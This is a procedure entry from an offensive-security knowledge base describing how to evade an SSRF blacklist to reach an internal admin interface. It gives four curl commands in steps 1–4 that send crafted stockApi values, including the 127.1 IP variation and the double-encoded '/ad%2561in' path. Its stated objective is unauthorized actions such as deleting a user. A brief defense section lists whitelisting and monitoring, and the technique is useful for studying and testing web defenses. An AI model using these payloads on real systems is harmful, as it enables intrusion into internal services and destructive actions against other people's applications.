---
type: procedure
description: >-
  Bypass server-side request forgery protections that blacklist common localhost
  indicators by using IP variations and double URL encoding to access internal
  admin interfaces.
verified: true
submitted: true
tactics:
  - '[[Initial Access]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
sub_techniques: []
tags:
  - SSRF
  - Web Applications
  - Bypass
  - Encoding
commands:
  - '[[commands/curl-send-stock-check]]'
  - '[[commands/curl-blocked-localhost-request]]'
  - '[[commands/curl-ip-variation-bypass]]'
  - '[[commands/curl-double-encoded-admin-bypass]]'
platforms:
  - Web
tools:
  - '[[tools/Burp-Suite]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
validated: true
---

# Bypass-SSRF-Blacklist-Filter-Using-Encoding

## Summary

This procedure demonstrates how to bypass blacklist-based filters in SSRF-vulnerable applications that block direct references to localhost (e.g., 127.0.0.1) by using IP address variations like 127.1 and double URL encoding to obfuscate paths, ultimately allowing access to internal admin interfaces for unauthorized actions such as user deletion.

## Description

Server-side request forgery (SSRF) vulnerabilities occur when an application fetches resources based on user-supplied URLs without proper validation. Blacklist filters often block obvious localhost indicators like '127.0.0.1' or 'localhost' to prevent internal access, but these can be evaded using techniques like decimal IP representations (e.g., 127.1 resolves to 127.0.0.1 in some contexts) or encoding sensitive characters (e.g., double URL encoding '%61' for 'a' in '/admin'). This procedure targets web applications with stock-checking or similar features that proxy requests to external APIs, assuming the backend resolves these evasions to internal services. It requires interception tools like Burp Suite to modify requests and observe responses. Successful bypass grants access to restricted internal endpoints, enabling actions like administrative deletions.

## Requirements

1. Access to a web application with a SSRF-vulnerable endpoint (e.g., a 'check stock' feature accepting URL parameters).
2. Proxy interception tool such as [[tools/Burp-Suite]] configured to intercept traffic.
3. Basic knowledge of HTTP requests and URL encoding.
4. Network access to the target application (no special credentials needed for initial access).

## Defense

Defensive measures and detection strategies:

- Implement whitelist-based URL validation instead of blacklists, restricting requests to approved domains.
- Use network segmentation to isolate internal services from application servers.
- Monitor application logs for suspicious URL patterns, including encoded or unusual IP formats.
- Enable web application firewall (WAF) rules to detect encoding bypass attempts and IP evasions.

## Objectives

1. Identify and confirm the SSRF vulnerability by triggering blocked requests.
2. Evade blacklist filters using IP variations and encoding to access internal resources.
3. Perform unauthorized actions on internal endpoints, such as deleting a target user via an admin interface.

## Instructions

### Step 1: Intercept Initial Stock Check Request

**Context**: Start by navigating to the product's stock check feature to capture the legitimate request structure. This establishes the baseline for modification and confirms the endpoint accepts user-supplied URLs.

**Instructions**: Use a browser to access the stock check page (e.g., /product/stock), then intercept the outgoing request with Burp Suite. Forward it to the Repeater tab for manipulation. Alternatively, simulate with curl if the API is directly accessible.

**Command** ([[commands/curl-send-stock-check]]):
```bash
curl -X POST http://target.com/api/check-stock \
  -H "Content-Type: application/json" \
  -d '{"stockApi": "http://legitimate-api.com/stock"}'
```

> This sends a valid stock check request. Expected output is a successful response with stock data, confirming the endpoint works.

### Step 2: Test Direct Localhost Access

**Context**: Attempt to redirect the request to localhost to confirm the blacklist filter is in place. This step verifies the SSRF vulnerability exists but is protected against obvious attempts.

**Instructions**: In Burp Repeater, modify the stockApi parameter to point to http://127.0.0.1/. Send the request and observe the blocked response (e.g., error message indicating invalid URL).

**Command** ([[commands/curl-blocked-localhost-request]]):
```bash
curl -X POST http://target.com/api/check-stock \
  -H "Content-Type: application/json" \
  -d '{"stockApi": "http://127.0.0.1/"}'
```

> Expected output: An error response (e.g., 400 Bad Request or "Invalid URL") due to the blacklist filter triggering on 127.0.0.1.

### Step 3: Bypass Using IP Variation

**Context**: Evade the localhost blacklist by using a variant like 127.1, which some resolvers interpret as 127.0.0.1. Append an internal path like /admin to target sensitive endpoints.

**Instructions**: Update the stockApi to http://127.1/admin in Burp Repeater and send. If still blocked, proceed to encoding; otherwise, observe access to the admin interface.

**Command** ([[commands/curl-ip-variation-bypass]]):
```bash
curl -X POST http://target.com/api/check-stock \
  -H "Content-Type: application/json" \
  -d '{"stockApi": "http://127.1/admin"}'
```

> Expected output: If bypassed, a response from the internal admin (e.g., HTML login or directory listing); if blocked, another error.

### Step 4: Obfuscate Path with Double URL Encoding

**Context**: If the IP variation is blocked on path elements, double-encode characters like 'a' in '/admin' (%61 decodes to 'a', %2561 double-decodes to %61 then 'a') to bypass additional filters.

**Instructions**: Modify stockApi to http://127.1/ad%2561in (double-encoded 'a'). Send the request to access the admin interface, then use it to delete the target user (e.g., via a DELETE request to /admin/users/{id}).

**Command** ([[commands/curl-double-encoded-admin-bypass]]):
```bash
curl -X POST http://target.com/api/check-stock \
  -H "Content-Type: application/json" \
  -d '{"stockApi": "http://127.1/ad%2561in"}'
```

> Expected output: Successful access to admin interface, allowing further actions like user deletion (e.g., 200 OK with admin page content).
